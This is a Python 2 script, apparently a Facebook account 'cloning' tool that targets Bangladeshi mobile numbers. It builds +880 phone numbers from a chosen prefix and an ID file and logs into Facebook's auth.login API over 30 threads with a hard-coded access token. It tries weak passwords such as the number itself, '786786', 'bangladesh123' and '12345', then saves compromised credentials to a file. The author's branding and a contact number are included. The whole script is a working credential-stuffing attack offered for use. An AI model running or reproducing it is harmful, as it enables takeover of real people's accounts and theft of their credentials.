    os.system('clear')
    print logo1
    print "\\033[1;43m[1]\x1b[1;97mSTART HACK WITH SYeD RaHiM ( \033[1;92m NOW)"
    time.sleep(0.05)
    print '\x1b[1;94m[0]\033[1;91m Exit ( Back)'
    pilih_login()

def pilih_login():
    peak = raw_input("\n\033[1;95mCHOOSE: \033[1;93m")
    if peak =="":
        print "\x1b[1;97mFill In Correctly"
        pilih_login()
    elif peak =="1":
        Zeek()
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;92m[1]  START CLONING BANGLADESH'
    time.sleep(0.10)
    print '\x1b[1;92m[0] back'
   
    time.sleep(0.05)
    action()

def action():
    peak = raw_input('\n\033[1;92mCHOOSE:\033[1;92m')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak =="1":              
        os.system("clear")
        print logo1
        print "\033[1;92mEnter any  Mobile code Number"+'\n'
        print '\033[1;92mEnter any code ,175,165,191, 192, 193, 194, 195, 196, 197, 198, 199'
        print '\033[1;92Only bangla phone number'
        try:
            c = raw_input("\033[1;97mCHOOSE : ")
            k="+880"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax()
    elif peak =='0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50* '\033[1;94m-'
    xxx = str(len(id))
    jalan("\033[0;92mBANGLADESH CLONING") 
    jalan("\033[0;92mALL OLD IDS")
    jalan("\033[0;92mK Alone '")
    jalan("\033[0;92mFACEBOOK")
    jalan("\033[0;92mSYeD RaHiM")
    jalan ('\033[1;92m Total ids number: '+xxx)
    jalan ('\033[1;92mCode you choose: '+c)
    jalan ("\033[1;92mWait A While Start Account Cracking...")
    jalan ("\033[1;92mTo Stop Process Press Ctrl+z")
    print 50* '\033[1;97m-'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass #Syed-Rahim
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m(Enjoy)  ' + k + c + user + ' в¬…вћЎ  ' + pass1                                       
                okb = open('save/cloned.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;92m(Cp) ' + k + c + user + '  в—Ђв–¶  ' + pass1
                    cps = open('save/cloned.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(Enjoy)  ' + k + c + user +  '  в¬…вћЎ  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;92m(Cp) ' + k + c + user + '  в—Ђв–¶  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3="786786"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(Enjoy)  ' + k + c + user + '  в¬…вћЎ  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;92m(Cp) ' + k + c + user + ' в—Ђв–¶   ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                else:
                                    pass4="bangladesh123"
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m(Enjoy)  ' + k + c + user + '  в¬…вћЎ  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;92m(Cp) ' + k + c + user + '  в—Ђв–¶  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        else:
                                            pass5="12345"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(Enjoy)  ' + k + c + user + '  в¬…вћЎ  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass5+'\n')
                                                okb.close()
                                                oks.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;92m(Cp) ' + k + c + user + '  в—Ђв–¶  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)
                                                                
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            


                                                                                                                                                                                                            
                                                                                                                                                                                                                    
                                                                                                                                                                                                            



        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
    print('Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your Offline account Will Open after 10 to 20 days")
    print ''
    print """
    
🇸​​​​​🇾​​​​​🇪​​​​​🇩​​​​​ 🇷​​​​​🇦​​​​​🇭​​​​​🇮​​​​​🇲​​​​​


\033[1;96mThanks me later
\033[1;95mFb\033[1;97mSYED
\033[1;95mWhatsapp 03168823296"""

    
    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login()

